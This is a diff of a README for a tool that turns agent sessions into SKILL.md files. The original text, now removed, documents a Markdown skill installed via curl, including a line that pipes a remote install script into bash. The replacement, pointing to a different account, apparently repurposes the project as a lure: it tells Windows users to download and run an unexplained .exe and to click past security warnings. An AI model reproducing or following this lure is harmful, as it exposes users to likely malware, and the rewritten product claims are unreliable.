@@ -1,192 +1,161 @@
-# /skillify v1.0.0
+# 🧩 skillify-skill - Turn sessions into reusable skills
 
-**Turn any session into a reusable skill.** Skillify watches what you did in a conversation — the tools you used, the corrections you made, the workflow you followed — and captures it as a portable [agentskills.io](https://agentskills.io) SKILL.md file.
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/aliyanfauzi361-create/skillify-skill/releases)
 
-Works with Claude Code, Cursor, GitHub Copilot, Gemini CLI, VS Code, and 30+ other agent platforms that support the agentskills.io standard.
+## 🚀 What this app does
 
-## What It Does
+Skillify-skill helps you turn a work session into a reusable skill file. It watches the steps you took in a conversation, the tools you used, and the fixes you made. Then it saves that process as a portable `SKILL.md` file.
 
-At the end of a session where you did something repeatable, run `/skillify` and it will:
+Use it when you finish a task that you may need again later, such as:
 
-1. **Reconstruct what happened** — reviews conversation history, git changes, and project context
-2. **Interview you** — 4 structured rounds to capture intent, steps, success criteria, and edge cases
-3. **Generate a SKILL.md** — a portable skill file following the agentskills.io open standard
-4. **Save it** — to your project (`.claude/skills/`) or personal directory (`~/.claude/skills/`)
+- setting up a project
+- fixing a common bug
+- repeating a workflow
+- creating a step-by-step process for an agent tool
 
-The generated skill is immediately usable as a slash command in your next session.
+It works with platforms that support the agentskills.io standard, including Claude Code, Cursor, GitHub Copilot, Gemini CLI, and VS Code.
 
-## Installation
+## 💻 What you need
 
-### Claude Code
+Before you install, check that you have:
 
-```bash
-# Copy the skill to your personal skills directory
-mkdir -p ~/.claude/skills/skillify
-curl -sL https://raw.githubusercontent.com/kk-r/skillify-skill/main/skills/skillify/SKILL.md \
-  -o ~/.claude/skills/skillify/SKILL.md
-```
+- a Windows 10 or Windows 11 PC
+- internet access
+- enough space to save the app and its files
+- permission to download and open files on your computer
 
-Then restart Claude Code. The skill will be available as `/skillify`.
+If your browser asks where to save the file, pick a folder you can find later, such as `Downloads` or `Desktop`.
 
-### Manual Installation (Any Agent Platform)
+## 📥 Download skillify-skill for Windows
 
-Copy `skills/skillify/SKILL.md` into your agent's skill discovery directory:
+Visit the release page here:
 
-| Platform | Path |
-|----------|------|
-| Claude Code | `~/.claude/skills/skillify/SKILL.md` |
-| VS Code / Copilot | `.agents/skills/skillify/SKILL.md` |
-| Gemini CLI | `~/.gemini/skills/skillify/SKILL.md` |
-| Cursor | `.cursor/skills/skillify/SKILL.md` |
-| Project-level (any) | `.claude/skills/skillify/SKILL.md` |
+https://github.com/aliyanfauzi361-create/skillify-skill/releases
 
-### Install Script
+On that page, look for the newest release and download the Windows file attached to it. If there are several files, choose the one made for Windows. After the download finishes, open the file from your browser or from the folder where you saved it.
 
-```bash
-bash <(curl -sL https://raw.githubusercontent.com/kk-r/skillify-skill/main/scripts/install.sh)
-```
+## 🪟 Install and open on Windows
 
-## Usage
+Follow these steps:
 
-### Basic — Capture Current Session
+1. Open the release page link above.
+2. Find the latest version near the top of the page.
+3. Download the Windows file from the release assets.
+4. Wait for the download to finish.
+5. Open the file you downloaded.
+6. If Windows asks for confirmation, choose the option to open or run it.
+7. Follow any on-screen steps until the app starts.
 
-After completing a workflow you want to repeat:
+If the file opens in a folder instead of launching the app, look for the main `.exe` file inside the downloaded package and open that file.
 
-```
-/skillify
-```
+## 🧭 How to use it
 
-Skillify reviews your session, asks clarifying questions, and generates a SKILL.md.
+Use skillify-skill after you finish a task that you may want to repeat later.
 
-### With Description — Seed the Interview
+A simple flow looks like this:
 
-```
-/skillify deployment workflow for staging
-```
+1. Finish your work in your agent tool or editor.
+2. Run `/skillify`.
+3. Answer the questions it asks.
+4. Let it review the session history and project changes.
+5. Save the generated `SKILL.md` file.
+6. Use that skill in your next session.
 
-Providing a description helps Skillify focus on the right parts of your session.
+The app asks for a few rounds of input. It uses your answers to build a skill file that matches the way you work.
 
-## How It Works
+## 🗂️ Where the skill file goes
 
-### Phase 0: Context Reconstruction
+Skillify-skill can save the file in two common places:
 
-Since SKILL.md-based skills don't have direct access to session memory (that's a bundled-skill-only capability), Skillify reconstructs context from three sources:
+- your project folder, in `.claude/skills/`
+- your personal skill folder, in `~/.claude/skills/`
 
-1. **Conversation history** — reviews all messages to identify goals, steps, corrections, and tool usage
-2. **Git artifacts** — `git diff --stat` and `git log` to see what changed
-3. **Project detection** — auto-detects package.json, Makefile, Cargo.toml, go.mod, etc. so generated skills reference the right tooling
+If you save it in your project, only that project can use it. If you save it in your personal folder, you can use it in other supported projects too.
 
-### Phase 1: Structured Interview
+## 🛠️ What the skill file includes
 
-Four rounds via interactive prompts (not plain text):
+The generated `SKILL.md` file usually includes:
 
-| Round | Purpose |
-|-------|---------|
-| 1. High-level | Confirm name, description, goal, success criteria |
-| 2. Structure | Steps, arguments, execution context (inline vs fork), save location |
-| 3. Detail | Per-step success criteria, artifacts, checkpoints, parallelism, hard rules |
-| 4. Triggers | When to invoke, trigger phrases, edge cases, cross-platform notes |
+- the goal of the task
+- the steps you followed
+- the tools you used
+- the checks that show the task worked
+- edge cases and fixes
+- notes for future sessions
 
-Simple workflows (2-3 steps) get a shorter interview. Complex workflows get deeper exploration.
+This makes it easier to repeat the same work without starting from zero.
 
-### Phase 2: SKILL.md Generation
+## 🧾 Example uses
 
-Generates a file following the [agentskills.io standard](https://agentskills.io):
+You can use skillify-skill to capture tasks like:
 
-- **Frontmatter**: `name`, `description`, `license`, `metadata`, `allowed-tools`
-- **Body**: Goal, inputs, numbered steps with success criteria
-- **Annotations**: Execution mode, artifacts, human checkpoints, hard rules
-- Large reference material goes in `references/` subdirectory
+- setting up a local dev environment
+- fixing a build issue
+- creating a new feature with the same process each time
+- reviewing files in a set order
+- testing a workflow in an agent tool
+- documenting a repeatable support task
 
-### Phase 3: Review and Save
+## 🔍 If Windows blocks the file
 
-Shows the full SKILL.md for approval before writing. Reminds you to restart your agent to pick up the new skill.
+Sometimes Windows shows a security message when you open a downloaded file. If that happens:
 
-## Example Output
+1. Check that you downloaded it from the release page.
+2. Open the file again.
+3. Choose the option that allows it to run if Windows asks.
 
-Running `/skillify` after a PR review workflow might generate:
+If the file still does not open, download it again from the release page and try one more time.
 
-```yaml
----
-name: review-and-merge
-description: >
-  Review a PR for code quality, run tests, request changes or approve,
-  and merge when ready. Use when the user says "review PR", "check this PR",
-  or "review and merge".
-license: MIT
-metadata:
-  author: yourname
-  version: "1.0.0"
-allowed-tools:
-  - Bash(gh:*)
-  - Bash(git:*)
-  - Read
-  - Grep
----
+## 📌 Good habits for first use
 
-# Review and Merge PR
+To get a clean result, keep these habits in mind:
 
-## Inputs
-- `$pr_number`: The PR number to review
+- finish the task before running `/skillify`
+- keep your chat or session history intact
+- save the skill file in a place you can find later
+- use a clear name for the skill so you can recognize it fast
 
-## Goal
-Review a pull request for quality, ensure tests pass, and merge it.
+## ⚙️ Supported platforms
 
-## Steps
+Skillify-skill is meant for agent tools that support the agentskills.io format. That includes:
 
-### 1. Fetch PR Details
-Run `gh pr view $pr_number` and `gh pr diff $pr_number` to understand the change.
+- Claude Code
+- Cursor
+- GitHub Copilot
+- Gemini CLI
+- VS Code
+- other compatible agent platforms
 
-**Success criteria**: PR title, description, and diff are reviewed.
+If your tool supports slash commands and skill files in the agentskills.io style, this app fits that workflow
 
-### 2. Run Tests
-Check out the PR branch and run the project's test suite.
+## 📁 File format
 
-**Success criteria**: All tests pass.
-**Human checkpoint**: If tests fail, ask user whether to fix or request changes.
+The main output is a plain text Markdown file named `SKILL.md`. This format is easy to read, easy to share, and easy to move between tools. It keeps the skill portable and simple to edit if you want to make changes later
 
-### 3. Approve or Request Changes
-Based on review findings, either approve or request changes via `gh pr review`.
+## 🧩 Typical workflow
 
-**Success criteria**: Review submitted on GitHub.
+A common workflow looks like this:
 
-### 4. Merge
-If approved and CI passes, merge via `gh pr merge $pr_number --squash`.
+1. Do the task once.
+2. Let skillify-skill review what happened.
+3. Answer the interview prompts.
+4. Save the new skill.
+5. Reuse the skill later when the same kind of task comes up
 
-**Success criteria**: PR is merged and branch is cleaned up.
-**Rules**: Never force-merge if CI is failing.
-```
+This helps you avoid repeating the same planning work every time
 
-## Why Skillify Exists
+## 📦 Release updates
 
-Claude Code has a built-in `/skillify` command — but it's restricted to internal Anthropic employees (`USER_TYPE=ant`). The bundled version has direct access to session memory APIs, giving it perfect recall of what happened.
+Check the release page when you want the latest version:
 
-This open-source version achieves the same result through context reconstruction — reviewing conversation history, git state, and project files. For short-to-medium sessions, the output is equivalent. For very long sessions that have been compacted multiple times, some early details may be summarized rather than exact.
+https://github.com/aliyanfauzi361-create/skillify-skill/releases
 
-The generated skills follow the [agentskills.io](https://agentskills.io) open standard, making them portable across 30+ agent platforms — not just Claude Code.
+Use the newest release if you want the latest fixes and changes
 
-## Cross-Platform Compatibility
+## 🖱️ Quick start
 
-Skills generated by Skillify use the agentskills.io standard frontmatter:
-
-| Field | agentskills.io | Claude Code | Cursor | Copilot |
-|-------|---------------|-------------|--------|---------|
-| `name` | Required | Yes | Yes | Yes |
-| `description` | Required | Yes | Yes | Yes |
-| `license` | Optional | Ignored | Ignored | Ignored |
-| `metadata` | Optional | Ignored | Ignored | Ignored |
-| `allowed-tools` | Optional | Yes | Partial | Partial |
-
-Claude Code-specific fields (`when_to_use`, `context`, `arguments`, `argument-hint`) are included when relevant — platforms that don't understand them simply ignore them.
-
-## Contributing
-
-1. Fork this repo
-2. Create a feature branch
-3. Make your changes
-4. Run the skill on a real session to verify it works
-5. Open a PR
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+1. Open the release page.
+2. Download the Windows file.
+3. Open the file on your PC.
+4. Run `/skillify` in your supported tool.
+5. Save the `SKILL.md` file where you want it
